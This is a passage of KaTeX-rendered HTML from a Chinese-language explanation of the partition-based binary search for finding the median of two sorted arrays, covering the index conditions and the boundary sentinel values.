class="mclose">)</span></span></span></span></p><p>第一个条件对于总长度是偶数和奇数的情况有所不同，但是可以将两种情况合并。第二个条件对于总长度是偶数和奇数的情况是一样的。</p><p>要确保这两个条件，只需要保证：</p><ul><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>+</mo><mi>j</mi><mo>=</mo><mi>m</mi><mo>−</mo><mi>i</mi><mo>+</mo><mi>n</mi><mo>−</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">i + j = m - i + n - j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>（当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>+</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m+n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 为偶数）或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>+</mo><mi>j</mi><mo>=</mo><mi>m</mi><mo>−</mo><mi>i</mi><mo>+</mo><mi>n</mi><mo>−</mo><mi>j</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i + j = m - i + n - j + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>（当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>+</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m+n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 为奇数）。等号左侧为前一部分的元素个数，等号右侧为后一部分的元素个数。将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 全部移到等号左侧，我们就可以得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>+</mo><mi>j</mi><mo>=</mo><mfrac><mrow><mi>m</mi><mo>+</mo><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">i+j = \frac{m + n + 1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。这里的分数结果只保留整数部分。</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mi>i</mi><mo>≤</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">0 \leq i \leq m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7955em;vertical-align:-0.136em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mi>j</mi><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">0 \leq j \leq n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>。如果我们规定 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext></mrow><annotation encoding="application/x-tex">\text{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">A</span></span></span></span></span> 的长度小于等于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>B</mtext></mrow><annotation encoding="application/x-tex">\text{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">B</span></span></span></span></span> 的长度，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m \leq n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>。这样对于任意的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">i \in [0, m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6986em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span>，都有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>=</mo><mfrac><mrow><mi>m</mi><mo>+</mo><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo>−</mo><mi>i</mi><mo>∈</mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">j = \frac{m + n + 1}{2} - i \in [0, n]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6986em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">]</span></span></span></span>，那么我们在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span> 的范围内枚举 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 并得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>，就不需要额外的性质了。</p><ul><li><p>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext></mrow><annotation encoding="application/x-tex">\text{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">A</span></span></span></span></span> 的长度较大，那么我们只要交换 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext></mrow><annotation encoding="application/x-tex">\text{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">A</span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>B</mtext></mrow><annotation encoding="application/x-tex">\text{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">B</span></span></span></span></span> 即可。</p></li><li><p>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>&gt;</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m &gt; n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ，那么得出的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 有可能是负数。</p></li></ul></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>≤</mo><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{B}[j-1] \leq \text{A}[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span> 以及 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>≤</mo><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{A}[i-1] \leq \text{B}[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>，即前一部分的最大值小于等于后一部分的最小值。</p></li></ul><p>为了简化分析，假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{A}[i-1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{B}[j-1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{A}[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{B}[j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>总是存在。对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">i=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">i=m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">j=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">j=n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 这样的临界条件，我们只需要规定 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>A</mtext><mo stretchy="false">[</mo><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mtext>B</mtext><mo stretchy="false">[</mo><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mo>−</mo><mi mathvariant="normal">∞</mi></mrow><annotation encoding="application/x-tex">\text{A}[-1]=\text{B}[-1]=-\infty</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">A</span></span><span class="mopen">[</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">∞</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>m</mi><mo stretchy="false">]</mo><mo>=</mo><mtext>B</mtext><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">∞</mi></mrow><annotation encoding="application/x-tex">A[m]=\text{B}[n]=\infty</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">m</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord">∞</span></span></span></span> 即可。这也是比较直观的：当一个数组不出现在前一部分时，对应的值为负无穷，就不会对前一部分的<strong>最大值</strong>产生影响；当一个数组不出现在后一部分时，对应的值为正无穷，就不会对后一部分的<strong>最小值</strong>产生影响。</p><p>所以我们需要做的是：</p><blockquote><p>在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, m]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">]</span></span></span></span> 中找到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span>，使得：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mspace width="2em"/><mtext>B</mtext><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo>≤</mo><mtext>A</mtext><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\qquad \text{B}[j-1] \leq \text{A}[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">B</span></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span 